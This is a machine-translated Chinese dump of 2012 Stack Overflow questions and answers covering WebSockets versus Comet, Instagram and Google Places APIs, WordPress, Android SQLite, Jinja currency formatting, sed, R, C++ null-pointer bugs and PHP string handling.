还有一些库构建在 AJAX/comet/WebSockets 传输层上，提供会话管理、频道、广播、发布订阅等功能**[。CometD](http://cometd.org)**就是一个例子。另一个流行的例子是**[Socket.IO](http://socket.io)**。如果 WebSockets 可用于底层传输，两者都支持 WebSockets，但如果 WebSockets 不可用，它们也支持标准 AJAX/long-poll。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-08-22T19:18:43.650

我最初以为[WebSockets 实现 Comet。他们不是替代品](http://www.leggetter.co.uk/2012/04/22/websockets-realise-comet-theyre-not-an-alternative.html)。然而，经过一番讨论，我后来得到了“彗星”的创造者[亚历克斯·拉塞尔](https://twitter.com/slightlylate)的纠正和说服，事实并非如此。

正如@kanaka 所说，Comet 是一组用于模拟客户端和服务器之间的双向通信的原则（服务器推送是解决方案的一半，现在由服务器发送事件和事件源 API 提供）。

但是，Comet 解决方案是 hack，因为它们在 Web 浏览器中的工作方式不一致。出于这个原因，亚历克斯·拉塞尔说：

> 接下来，Web Sockets 是 Comet 的一种形式吗？或者 Comet 只是 HTTP 黑客？我会选择后一个定义。这句话和黑客应该一起骑到日落。我，一方面，欢迎我们的非 HTTP 实时霸主。在某种程度上我们可以忘记旧浏览器（上帝知道我正在尽我的一份力：http: [//google.com/chromeframe](http://google.com/chromeframe)），我们都可以使用“Web Sockets”以及对任何特定保护伞的需求消失了。
> 
> 因此，让我们专注于这一点：我们如何让用户进入闪亮的新浏览器汽车？关于基于 WebSockets 的应用程序可以提供的丰富性和实时体验，我们可以向他们提供什么样的提议？彗星是关于过去的。让未来成为现实。

我现在和亚历克斯一起做这个。然而，Comet - HTTP 解决方案 - 不会过时，直到：

1.  浏览器支持是 100%，我们不需要 < IE10 的后备。我不相信 Firefox、Safari 和 Opera 用户会成为问题。可能有一小部分用户忽略了 Firefox 等浏览器的自动更新提示，但并不多。
2.  防病毒制造商（例如 Avast！）开始支持 HTML5 网络技术并停止他们的软件干扰连接。
3.  更新了一些 Internet 基础设施以确保对 WebSockets 的支持。根据我的经验，通过端口 443（安全的 WebSocket 连接）通过 WSS 连接通常意味着连接通过防火墙和代理，但我们也希望始终支持通过端口 80 的 WS。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T18:17:52.070

虽然 WebSocket 在最基本的层面上确实提供了一种在 Web 和 HTTP 的上下文中在客户端和服务器之间进行双向通信的方式，但它是一种简单的通信形式。

Comet 在 WebSocket 之上提供了更多的功能（事实上，cometd 甚至支持 websocket），对于特性：

*   比如发布/订阅和通信渠道
*   当 websocket 不可用时回退到旧客户端<->服务器通信技术****

# php - Instagram API 加载关注或主页的媒体

> ID：12078554
> 
> 赞同：0
> 
> 时间：2012-08-22T17:40:38.097
> 
> 标签：php, javascript, oauth, instagram

我正在制作一个 Instagram 应用程序。我有登录和访问令牌工作，我可以请求数据。但是，我不知道如何加载用户将在应用程序主页上看到的提要。我可以根据位置+时间搜索图片，我可以加载特定用户的帖子，我可以加载用户的帖子。有我可以阅读的“家庭”提要吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T20:19:25.627

是的，有。只需拨打电话

```
https://api.instagram.com/v1/users/self/feed?access_token=ACCESS-TOKEN 
```

如[用户端点文档](http://instagram.com/developer/endpoints/users/#get_users_feed)中所述。

# url - cakephp 的 url 因服务器而异

> ID：12078563
> 
> 赞同：0
> 
> 时间：2012-08-22T17:41:24.490
> 
> 标签：url, cakephp

这是我的问题。在我的电脑（wamp）上，如果我单击使用 $id var 的链接，它会转到正确的页面并且链接已经正确（例如（index.php/prenotation/1）。我将我的网站上传到 bytehost 网站, 如果我点击同一个链接, 没有最终的 $id 是错误的 (index.php/prenotation). 我不认为这与主机类型有关。

感谢帮助。

# php - 如何在 Wordpress 中正确调用元函数

> ID：12078564
> 
> 赞同：-1
> 
> 时间：2012-08-22T17:41:25.100
> 
> 标签：php, wordpress, function, call, meta

我正在为我的 Wordpress 网站开发作者徽章，并且正在学习如何调用元函数（需要在循环中）。我调用的元函数与作者生物相关，如用户名、姓氏等

这是一个代码示例：

```
<?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>

    About <?php the_author(); ?>, the author of this blog
    <?php userphoto_the_author_thumbnail() ?>
    <?php get_the_author_meta( 'description' ); ?>

<?php endwhile; else: ?>
<p><?php _e('Sorry, no posts matched your criteria.'); ?></p>
<?php endif; ?> 
```

我将此示例添加到我的 author.php 文件中并且它有效，但是它多次显示相同的内容（因此出现循环）。如果我想在 Wordpress 中调用元函数而不是像这样多次回显它们，我该怎么做？

我确信我做错了，并且有一个正确的方法来实现它。

如果您选择回复，请详细说明，因为我对 PHP 编码的了解已经达到了我*今天*了解什么是 echo 的程度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:10:05.943

Since you've added this to your `author.php` file, all of the posts will be by one author. So I'm guessing you want to display this content only once.

Changing your code like this will do it:

```
<?php $show_author_data = TRUE;?>
<?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>

<?php if(!$show_author_data){ ?>
  About <?php the_author(); ?>, the author of this blog
  <?php userphoto_the_author_thumbnail() ?>
  <?php get_the_author_meta( 'description' ); ?>
<?php $show_author_data = FALSE; } ?>

<?php endwhile; else: ?>
<p><?php _e('Sorry, no posts matched your criteria.'); ?></p>
<?php endif; ?> 
```

This sets a `$show_author_data` flag for the first pass only.

# java - 未定义的构造函数 SQLite 游标

> ID：12078565
> 
> 赞同：1
> 
> 时间：2012-08-22T17:41:36.410
> 
> 标签：java, android

我正在尝试为 android 上的 SQlite 数据库创建一个表。该表有 5 列，Int id、URL 链接、字符串标题、字符串描述和日期日期。

为了构建我的代码，我一直在使用[this](http://www.androidhive.info/2011/11/android-sqlite-database-tutorial/)和[this](http://www.vogella.com/articles/AndroidSQLite/article.html)作为参考，但都没有展示如何向光标添加除字符串之外的任何内容。

这是我的代码：

```
public class Chapter {

final SimpleDateFormat FORMATTER = 
        new SimpleDateFormat("EEE, dd MMM yyyy HH:mm:ss Z");
    private String title;
    private URL link;
    private String description;
    private Date date;
    private int id;

    //Constructor for table includes ID.
    public Chapter(int id, URL link, String title, String description, Date date) {
        this.id = id;
        this.link = link;
        this.title = title;
        this.description = description;
        this.date = date;
    }

    //Empty Constructor
    public Chapter() {
        // TODO Auto-generated constructor stub
    }

    public String getTitle() {
        return title;
    }

    public void setTitle(String title) {
        this.title = title.trim();
    }
    // getters and setters omitted for brevity 
    public URL getLink() {
        return link;
    }

    public void setLink(String link) {
        try {
            this.link = new URL(link);
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
    }

    public String getDescription() {
        return description;
    }

    public void setDescription(String description) {
        this.description = description.trim();
    }

    public String getDate() {
        return FORMATTER.format(this.date);
    }

    public void setDate(String date) {
        // pad the date if necessary
        while (!date.endsWith("00")){
            date += "0";
        }
        date = "";
        try {
            this.date = FORMATTER.parse(date.trim());
        } catch (ParseException e) {
            throw new RuntimeException(e);
        }
    }

    public Chapter copy(){
        Chapter copy = new Chapter();
        copy.title = title;
        copy.link = link;
        copy.description = description;
        copy.date = date;
        return copy;
    }

    @Override
    public String toString() {
        StringBuilder sb = new StringBuilder();
        sb.append("Title: ");
        sb.append(title);
        sb.append('\n');
        sb.append("Date: ");
        sb.append(this.getDate());
        sb.append('\n');
        sb.append("Link: ");
        sb.append(link);
        sb.append('\n');
        sb.append("Description: ");
        sb.append(description);
        return sb.toString();
    }

    @Override
    public int hashCode() {
        final int prime = 31;
        int result = 1;
        result = prime * result + ((date == null) ? 0 : date.hashCode());
        result = prime * result
                + ((description == null) ? 0 : description.hashCode());
        result = prime * result + ((link == null) ? 0 : link.hashCode());
        result = prime * result + ((title == null) ? 0 : title.hashCode());
        return result;
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj)
            return true;
        if (obj == null)
            return false;
        if (getClass() != obj.getClass())
            return false;
        Chapter other = (Chapter) obj;
        if (date == null) {
            if (other.date != null)
                return false;
        } else if (!date.equals(other.date))
            return false;
        if (description == null) {
            if (other.description != null)
                return false;
        } else if (!description.equals(other.description))
            return false;
        if (link == null) {
            if (other.link != null)
                return false;
        } else if (!link.equals(other.link))
            return false;
        if (title == null) {
            if (other.title != null)
                return false;
        } else if (!title.equals(other.title))
            return false;
        return true;
    }

    public int compareTo(Chapter another) {
        if (another == null) return 1;
        // sort descending, most recent first
        return another.date.compareTo(date);
    }

    public int getId() {
        // TODO Auto-generated method stub
        return id;
    }

    public void setId(int parseInt) {
        // TODO Auto-generated method stub
        this.id = id;
    }

    public void setImage(String string) {
        // TODO Auto-generated method stub

    } 
```

和我的助手类：

```
public class ChapterSQLiteOpenHelper extends SQLiteOpenHelper {

private static final String DATABASE_NAME = "chaptertable";
  private static final int DATABASE_VERSION = 1;

  // Database table
  public static final String TABLE_CHAPTER = "Chapter";
  public static final String COLUMN_ID = "_id";
  public static final String COLUMN_LINK = "link";
  public static final String COLUMN_TITLE = "title";
  public static final String COLUMN_DESCRIPTION = "description";
  public static final String COLUMN_PUBDATE = "pubdate";
  public static final String COLUMN_IMAGEID = "imageid";

  // Database creation SQL statement
  private static final String DATABASE_CREATE = "create table " 
      + TABLE_CHAPTER
      + "(" 
      + COLUMN_ID + " integer primary key autoincrement, " 
      + COLUMN_LINK + " text not null, " 
      + COLUMN_TITLE + " text not null," 
      + COLUMN_DESCRIPTION + " text not null" 
      + COLUMN_PUBDATE + " text not null," 
      + COLUMN_IMAGEID + " text not null," 
      + ");";

  public ChapterSQLiteOpenHelper(Context context) {
    super(context, DATABASE_NAME, null, DATABASE_VERSION);
  }

  // Method is called during creation of the database
  @Override
  public void onCreate(SQLiteDatabase database) {
        database.execSQL(DATABASE_CREATE);
      }

  // Method is called during an upgrade of the database,
  // e.g. if you increase the database version
  // Upgrading database
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // Drop older table if existed
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_CHAPTER);

        // Create tables again
        onCreate(db);
    }

  /**
     * All CRUD(Create, Read, Update, Delete) Operations
     */

    // Adding new contact
    void addContact(Chapter chapter) {
        SQLiteDatabase db = this.getWritableDatabase();

        ContentValues values = new ContentValues();
        values.put(COLUMN_ID, chapter.getId()); // Chapter ID
        values.put(COLUMN_LINK, chapter.getLink()); // Chapter Link
        values.put(COLUMN_TITLE, chapter.getTitle()); // Chapter Title
        values.put(COLUMN_DESCRIPTION, chapter.getDescription()); // Chapter Description
        values.put(COLUMN_PUBDATE, chapter.getDate()); // Chapter Date
        //values.put(COLUMN_IMAGEID, chapter.getImage()); // Chapter Image

        // Inserting Row
        db.insert(TABLE_CHAPTER, null, values);
        db.close(); // Closing database connection
    }

    // Getting single contact
    Chapter getChapter(int id) {
        SQLiteDatabase db = this.getReadableDatabase();

        Cursor cursor = db.query(TABLE_CHAPTER, new String[] { COLUMN_ID,
                COLUMN_ID, COLUMN_LINK }, COLUMN_ID + "=?",
                new String[] { String.valueOf(id) }, null, null, null, null);
        if (cursor != null)
            cursor.moveToFirst();

        Chapter chapter = new Chapter(Integer.parseInt(cursor.getString(0)), cursor.getURL(1), cursor.getString(2), cursor.getString(3), cursor.getString(4));
        // return contact
        return chapter;
    }

    // Getting All Contacts
    public List<Chapter> getAllContacts() {
        List<Chapter> chapterList = new ArrayList<Chapter>();
        // Select All Query
        String selectQuery = "SELECT  * FROM " + TABLE_CHAPTER;

        SQLiteDatabase db = this.getWritableDatabase();
        Cursor cursor = db.rawQuery(selectQuery, null);

        // looping through all rows and adding to list
        if (cursor.moveToFirst()) {
            do {
                Chapter chapter = new Chapter();
                chapter.setId(Integer.parseInt(cursor.getString(0)));
                chapter.setLink(cursor.getURL(1));
                chapter.setTitle(cursor.getString(2));
                chapter.setDescription(cursor.getString(3));
                chapter.setDate(cursor.getString(4));
                //chapter.setImage(cursor.getString(5));
                // Adding chapter to list
                chapterList.add(chapter);
            } while (cursor.moveToNext());
        }

        // return contact list
        return chapterList;
    }

    // Updating single contact
    public int updateContact(Chapter chapter) {
        SQLiteDatabase db = this.getWritableDatabase();

        ContentValues values = new ContentValues();
        values.put(COLUMN_ID, chapter.getId());
        values.put(COLUMN_LINK, chapter.getLink());
        values.put(COLUMN_TITLE, chapter.getTitle());
        values.put(COLUMN_DESCRIPTION, chapter.getDescription());
        values.put(COLUMN_PUBDATE, chapter.getDate());
        //values.put(COLUMN_IMAGEID, chapter.getImage());

        // updating row
        return db.update(TABLE_CHAPTER, values, COLUMN_ID + " = ?",
                new String[] { String.valueOf(chapter.getId()) });
    }

    // Deleting single contact
    public void deleteContact(Chapter chapter) {
        SQLiteDatabase db = this.getWritableDatabase();
        db.delete(TABLE_CHAPTER, COLUMN_ID + " = ?",
                new String[] { String.valueOf(chapter.getId()) });
        db.close();
    }

    // Getting contacts Count
    public int getChaptersCount() {
        String countQuery = "SELECT  * FROM " + TABLE_CHAPTER;
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor cursor = db.rawQuery(countQuery, null);
        cursor.close();

        // return count
        return cursor.getCount();
    } 
```

我在 values.put 行上得到编译错误链接，以及 Chapter chapter = new Chapter... 行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:51:26.200

您需要在`copy()`方法中使用 setter 方法设置属性，例如：

```
public Chapter copy(){
    Chapter copy = new Chapter();
    copy.setTitle(this.title);
    copy.setLink(this.link);
    copy.setDescription(this.description);
    copy.setDate(this.date);
    return copy;
} 
```

# search - 什么 sed 脚本可以用另一个字符替换一系列十六进制字符

> ID：12078570
> 
> 赞同：2
> 
> 时间：2012-08-22T17:41:58.410
> 
> 标签：search, replace, sed, binary, hex

我需要用空格替换一些自动生成的文件中的一些非文本字符。虽然它们是处理后的文本文件，但添加了一些字符，不能再作为文本编辑

有没有 sed 命令可以做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T17:46:55.917

根据您的平台和`sed`版本，您可能会也可能不会执行以下操作`s/[\000-\037]/ /g`；但便携式和简单的替代方案是这样的：

```
tr '\000-\037' ' ' <input >output 
```

（所有字符代码都是“二进制”；我假设您的意思是控制字符，但如果您指的是 8 位字符`\200-\377`或其他字符，那么调整范围显然是微不足道的。）

# python - Jinja 模板 - 将浮点数格式化为逗号分隔的货币

> ID：12078571
> 
> 赞同：51
> 
> 时间：2012-08-22T17:41:59.443
> 
> 标签：python, flask, jinja2

我正在尝试将浮点数格式化为逗号分隔的货币。例如`543921.9354`变成`$543,921.94`. 我`format`在 Jinja 模板中使用过滤器，它似乎模仿 Python 中的`%`运算符而不是 Python`format`函数？

如何在 Jinja 中完成这种格式化？是否可以使用`format`过滤器？到目前为止，这就是我所拥有的，它完成了除逗号之外的所有操作：

`"$%.2f"|format(543921.9354)`

这当然会产生

`$543921.94`

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2015-07-01T10:29:26.247

Update: Using Jinja2 and Python 3, this worked quite nicely in the template without having to define any custom code:

```
{{ "${:,.2f}".format(543921.9354) }} 
```

I'm not sure exactly what the dependencies are to have this work, but IMHO anyone else reading this answer would do well to at least try it before worrying about custom filters.

* * *

## 回答 #2

> 赞同：52
> 
> 时间：2012-08-22T20:07:09.730

为此编写一个[自定义过滤器](http://jinja.pocoo.org/docs/api/#custom-filters)。如果您使用的是 python 2.7，它可能如下所示：

```
def format_currency(value):
    return "${:,.2f}".format(value) 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2018-04-28T09:44:37.613

# Python3.6:

```
def numberFormat(value):
    return format(int(value), ',d') 
```

# Flask global filter

```
@app.template_filter()
def numberFormat(value):
    return format(int(value), ',d') 
```

# Flask global filter for Blueprint

```
@app.app_template_filter()
def numberFormat(value):
    return format(int(value), ',d') 
```

# Call this global filter

```
{{ '1234567' | numberFormat }}
#prints 1,234,567 
```

# Calling it in Jinja without assigning a global filter

```
{{ format('1234567', ',d') }}
#prints 1,234,567 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2016-01-28T17:53:36.010

To extend @alex vasi's answer, I would definitely write a custom filter, but I'd also use python's own `locale` functionality, which handles currency grouping, and the symbol,

```
def format_currency(value):
    return locale.currency(value, symbol=True, grouping=True) 
```

The main thing to take note of using `locale` is that it doesn't work with the default 'C' locale, so you have to set it so something that's available on your machine.

For what you're looking for, you probably need,

```
locale.setlocale(locale.LC_ALL, 'en_US.UTF-8') 
```

but if you wanted sterling pounds, you'd use,

```
locale.setlocale(locale.LC_ALL, 'en_GB.UTF_8') 
```

.

```
import locale
locale.setlocale(locale.LC_ALL, 'en_US')
locale.currency(543921.94, symbol=True, grouping=True)
> '$543,921.94'
locale.setlocale(locale.LC_ALL, 'en_GB')
> '£543,921.94' 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-09-25T14:20:09.880

**如果您有 Python 2.6 或更高版本：**

您可以出于一个目的编写自定义过滤器，但作为更广泛的解决方案，您还可以更新格式过滤器本身：

```
from jinja import Environment, FileSystemLoader

def format(fmt_str, *args, **kwargs):
    if args and kwargs:
        raise jinja2.exceptions.FilterArgumentError(
            "can't handle positional and keyword "
            "arguments at the same time"
        )
    ufmt_str = jinja2.utils.soft_unicode(fmt_str)
    if kwargs:
        return ufmt_str.format(**kwargs)
    return ufmt_str.format(*args)

env = Environment(loader=FileSystemLoader('./my/template/dir'))
env.filters.update({
    'format': format,
}) 
```

This will replace the existing `format` filter (as of Jinja 2.7.1). The majority of the function was ripped straight from the [`format`](https://github.com/mitsuhiko/jinja2/blob/master/jinja2/filters.py#L532) source. The only difference between this function and jinja's is that it uses the [`str.format()`](http://docs.python.org/2.6/library/stdtypes.html#str.format) function to format the string.

Seeing that Jinja2 (at the time of this writing) no longer supports Python 2.5, I bet it won't be long before the `format` filter uses Python's [`str.format()`](http://docs.python.org/2.6/library/stdtypes.html#str.format).

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2019-04-10T01:21:17.003

Custom Filter using Babel (Can be used to format other currencies as well)

Install Babel ([http://babel.pocoo.org/en/latest/api/numbers.html](http://babel.pocoo.org/en/latest/api/numbers.html))

```
pip install Babel 
```

Custom Jinja Filter

```
from babel.numbers import format_currency

@app.template_filter()
def usdollar(value):
   return format_currency(value, 'USD', locale='en_US')

app.jinja_env.filters['usdollar'] = usdollar 
```

Usage in Jinja Template:

```
{{ '-10000.500' | usdollar }}

Output : -$10,000.50 
```

# .net - ASP.NET MVC 显示模板性能问题

> ID：12078573
> 
> 赞同：1
> 
> 时间：2012-08-22T17:42:05.010
> 
> 标签：.net, asp.net-mvc, debugging

刚刚看到我的一个页面非常慢，所以我开始调试它并在互联网上找到了几个线程[停止恐慌：如何提高 HtmlHelper.RenderPartial 性能。不要](http://codeclimber.net.nz/archive/2009/04/22/how-to-improve-htmlhelper.renderpartial-performances-donrsquot-run-in-debug-mode.aspx)在应在 web.config 文件的设置中执行 debug="true" 的调试模式下运行。

这部分是正确的......在 IIS Express 上它不起作用，但是当我将站点发布到 IIS 7.5 时它很快。

IIS Express 2.4 秒。IIS 7.5 132 毫秒

相同的站点...相同的配置。

### 从链接

```
protected VirtualPathProviderViewEngine()
{
  if (HttpContext.Current == null || HttpContext.Current.IsDebuggingEnabled)
    this.ViewLocationCache = DefaultViewLocationCache.Null;
  else
    this.ViewLocationCache = (IViewLocationCache) new DefaultViewLocationCache();
} 
```

因此，我试图查看在 IIS Express 中运行我的 Web 应用程序时的值是什么。

```
HttpContext: False
IsDebuggingEnabled: False 
```

所以......我一定在这里做错了什么。问题是什么？IIS Express 有那么差的性能吗？页面上大约有 100 个 Html.DisplayFor ......但 132 毫秒与 2.4 秒相差太大了。

请让我知道如何调试这个...

# python - Unix：像 Mathematica 一样在 X 上获取鼠标坐标？

> ID：12078575
> 
> 赞同：2
> 
> 时间：2012-08-22T17:42:11.797
> 
> 标签：python, r, language-agnostic, wolfram-mathematica, x11

**数学**

```
DynamicModule[{list = {}}, 
 EventHandler[
  Dynamic[Framed@
    Graphics[{BSplineCurve[list], Red, Line[list], Point[list]}, 
     PlotRange -> 2]], {{"MouseClicked", 
     1} :> {AppendTo[list, 
      MousePosition["Graphics"]]}}, {"MouseClicked", 2} :> 
   Print[list]]] 
```

我想在没有 Mathematica 的家里做上述事情。使用您想要的任何工具，我喜欢使用 Python 和 R，但对任何候选解决方案都很满意。我首先想到的是 RStudio 和这个问题[，](https://stackoverflow.com/questions/9812547/r-gui-vizualiser-with-command-line-access-browser-based-letting-users-to-s)但我不确定是否有更好的方法来做到这一点。

*如何在 X 上进行交互式 GUI 创新？*

**Mathematica -snippet 的过程概述**

```
1\. you click points

2\. you will see BSplineCurve formating between the points and points are red

3\. points are saved to an array

4\. when finished, you click `right-mouse-button` so array to stdout 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T19:15:41.600

这是一个 R 函数，可以执行您所描述的操作：

```
dynmodfunc <- function() {
    plot(0:1,0:1,ann=FALSE,type='n')
    mypoints <- matrix(ncol=2, nrow=0)
    while( length(p <- locator(1, type='p', col='red')) ) {
        mypoints <- rbind(mypoints, unlist(p))
        plot(mypoints, col='red', ann=FALSE, xlim=0:1, ylim=0:1)
        if(nrow(mypoints)>1) {
            xspline(mypoints, shape=-1)
        }
    }
    mypoints
}

(out <- dynmodfunc()) 
```

您可以更改`shape`参数以`xspline`更改样条线的样式。此版本返回具有 x 和 y 值的 2 列矩阵，但如果愿意，可以将其更改为另一种结构。还有很多其他的东西可以定制。

添加了将输出粘贴到 Mathematica 的功能：

```
matrix2mathematica <- function(x) {
    paste0( '{', 
        paste0( '{', x[,1], ', ', x[,2], '}', collapse=', '),
    '}')
}

cat( matrix2mathematica(out)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:52:35.373

随意查看/借鉴我`RateSketch()`在 R 中的笨拙、错误的函数，它[在此处](https://github.com/timriffe/RateSketch/blob/master/RateSketch/R/RateSketch.R)执行类似的操作。你可以根据你的情况减少它，有足够的简化空间

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T18:39:31.943

只是一个简单的例子`locator`：

```
plot(1:10)
point <- locator(1)
# now click somewhere on the plot

point
$x
[1] 8.010256

$y
[1] 7.980781 
```

（结果当然会根据您单击的位置而有所不同）

# c++ - C++异常访问冲突

> ID：12078576
> 
> 赞同：1
> 
> 时间：2012-08-22T17:42:17.817
> 
> 标签：c++, exception, exception-handling, access-violation

此代码运行正确，但在一个不确定的时刻，我在行遇到**异常访问冲突**

```
return lhs.getGeneralType()->getID() != rhs.getGeneralType()->getID(); 
```

并且错误破坏了我的应用程序...我已经尝试使用**/EHa**进行编译，但是错误

重复...这行代码多次正确运行，一段时间后出现此错误..

```
if (lhs.getType() == rhs.getType()) {

    try {

        if (lhs.getGeneralType() != NULL && lhs.getGeneralType() != NULL)
            return lhs.getGeneralType()->getID() != rhs.getGeneralType()->getID();
        else if (lhs.getGeneralType() == NULL && lhs.getGeneralType() == NULL)
            return false;
        else if (lhs.getGeneralType() != NULL && lhs.getGeneralType() == NULL)
            return false;
        else if (lhs.getGeneralType() == NULL && lhs.getGeneralType() != NULL)
            return true;
        else
            return true;

    } catch(char * e) { // tried also exception & , char* e
        return true;
    }   
} else
    return true; 
```

getGeneralType() 返回的类型定义如下

```
 class Type
  {
  private:
    int _id;
  public:
    Type(int id);
    operator int() const;
    int getID() const;
  }; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T17:49:13.863

看起来像是 if 语句中的拼写错误

```
if (lhs.getGeneralType() != NULL && lhs.getGeneralType() != NULL) 
```

其中之一`lhs`应该是`rhs`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T17:49:26.977

```
if (lhs.getGeneralType() != NULL && lhs.getGeneralType() != NULL) 
```

您有一个复制和粘贴错误。那应该是：

```
if (lhs.getGeneralType() != NULL && rhs.getGeneralType() != NULL)
                                    ^ 
```

对于其他比较也是如此。

结果，您引用了一个空指针，给出了未定义的行为；在这种情况下，访问冲突。这不是 C++ 异常，因此不能用`catch`块处理。我相信微软的 C++ 方言提供了一些非标准的方法来捕捉和恢复这些（`__try`并且`__catch`可能），但修复错误比使用那种废话要好得多。

# google-apps-script - Google Places API 请求被拒绝

> ID：12078583
> 
> 赞同：0
> 
> 时间：2012-08-22T17:42:35.303
> 
> 标签：google-apps-script

我正在尝试使用 Google Places API 从 google 应用程序脚本中按名称和位置查找企业。该脚本使用 Google Drive 电子表格作为企业名称和位置的来源。

我坚持的部分是对 Google Places 的 URLFetch 调用。当我拨打电话时，我收到“请求被拒绝”错误。我认为这与我的身份验证有关。我需要使用什么身份验证，Oauth 还是 API 密钥？

我目前正在使用 API Key，但它仍然失败。API Key 是在脚本编辑器中使用，还是仅在外部域托管的 Web 应用程序中使用？

编辑：所以，当我插入我的变量并对 URL 进行硬编码时，我得到了很好的结果，但是当我生成这样的 URL 时出现错误：

```
var options =
{
  "query" : 'REI',
  "key" : 'MYKEY',
  "sensor" : false,
  "location" : latlon,
  "radius" : 8000,
};
var result = UrlFetchApp.fetch("https://maps.googleapis.com/maps/api/place/textsearch/json", options); 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T04:33:58.273

您传递给 URLFetch 的选项是错误的。有关可以作为选项传递的内容，请参阅[UrlFetch 文档。](https://developers.google.com/apps-script/class_urlfetchapp#fetch)

你的电话必须是这样的

`var result = UrlFetchApp.fetch('https://maps.googleapis.com/maps/api/place/textsearch/output?query=REI&key=MYKEY&sensor=false&location=latlon&radius=8000')`

# memcached - memcached如何缓存对象列表

> ID：12078585
> 
> 赞同：0
> 
> 时间：2012-08-22T17:42:43.387
> 
> 标签：memcached

我想知道 memcached 如何在内部缓存对象列表？它是序列化对象列表并将其粘贴到缓存中，还是序列化每个单独的对象，并将它们粘贴在密钥中但都共享一个共同的签名，以便以后可以一起检索它们？谢谢，

大卫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T20:26:28.197

这取决于客户端库，两种方法都可以实现。整个列表可能更有可能是序列化的，这就是 Spymemcached 客户端中的工作方式。

# php - 在 PHP 中用“+”替换前导零

> ID：12078588
> 
> 赞同：-4
> 
> 时间：2012-08-22T17:42:56.650
> 
> 标签：php

我想用“+”和国家代码替换电话号码中的前导零。

如果电话号码以零开头（例如：07512345678），那么我想删除前导零并替换为“+”和其他国家/地区代码（例如：7512​​345678）只需添加“+”和国家/地区代码。

在 PHP 中这样做的方法是什么？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-22T17:45:29.457

利用[`preg_replace()`](http://php.net/manual/en/function.preg-replace.php)

```
$newNumber = preg_replace('/^0?/', '+'.$countryCode, $phoneNumber); 
```

第一个参数是正则表达式，它正在寻找你的前导零。第二个是您要替换它的内容（加号与国家代码连接。）。最后，`$phoneNumber`是原来的电话号码。

替换的值被分配给变量`$newNumber`。随意更改变量以适合您的代码。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T17:54:45.593

使用[`substr_replace()`](http://php.net/substr_replace)，不需要正则表达式或`if`块。

```
$number = '07512345678';
$country_code = '44';

$new_number = substr_replace($number, '+'.$country_code, 0, ($number[0] == '0')); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T17:45:13.827

你可以使用`preg_replace`：

```
$newNumber = preg_replace("/^0/", "+", 07512345678) 
```

当且仅当它为零时，这将替换每个数字的第一个字符。使用的正则表达式是：`/^0/`. 告诉它查看第`^`一个字符，然后只匹配一个 0。这个 0 将被第二个参数“+”替换。最后一个参数是源字符串。

**参考**

*   看看`preg_replace` [这里](http://php.net/manual/en/function.preg-replace.php)
*   [此处](http://www.regular-expressions.info/reference.html)开始 REGEX 的基本语法

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T17:47:55.690

由于整个系统的复杂性，我怀疑 preg_match() 不太有效。

```
<?php
$countryCode = "XX";
$phone = array("0123455", "7837373");
foreach( $phone AS $number ) {
   if( $number[0] == '0' ) {
      $number = "+{$countryCode}" . substr($number,1);
   }
   echo "{$number}\n";
} 
```

PS：这是初级的。你真的应该通过一些教程。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T17:45:31.903

您可以使用字符串操作：

```
$x = '012345678';
if ($x[0]=='0') $x[0] = ''; // delete leading zero
$x = '+1'.$x; 
```

# javascript - 在进程外/通过 XPCOM 将 JS 注入浏览器

> ID：12078591
> 
> 赞同：0
> 
> 时间：2012-08-22T17:43:00.627
> 
> 标签：javascript, code-injection, xpcom

`.exe`我需要从外部或通过 XPCOM 调用从 C++ 代码将一段 JavaScript 代码注入浏览器的当前页面。我想如果我编写一个插件/扩展并使用 C++`.dll`通过 XPCOM 调用它的代码，它`.dll`会被加载到浏览器进程中，因此应该可以从中访问当前页面元素。

当然，我不是为了一些讨厌的黑客目的而要求这样做，我只需要一种将 JavaScript 注入页面而不暴露其代码的方法。

# c++ - 用于从键盘进行异步输入的库

> ID：12078592
> 
> 赞同：1
> 
> 时间：2012-08-22T17:43:01.360
> 
> 标签：c++, console

我有一个在标准输出上打印的控制台应用程序。我想实现以下行为：

*   输出一圈打印（每圈后休息 2 秒）
*   用户可以（对他来说是可选的）按一个键开始打印其他数据
*   当用户不点击任何东西时，只打印输出，没有任何变化
*   当用户单击预定义的键时（即使在打印输出期间他也可以这样做）应该调用一些函数

起初我考虑在其他线程中执行此操作（一个用于打印，一个用于等待输入），但我认为在这种情况下它没有用，因为在线程中等待输入是不可能的。

所以我找到了两个可能能够做到这一点的库：

*   简单快速的多媒体库（SFML）：[http ://www.sfml-dev.org/index.php](http://www.sfml-dev.org/index.php)
*   ncurses：[http ://www.gnu.org/software/ncurses/ncurses.html](http://www.gnu.org/software/ncurses/ncurses.html)

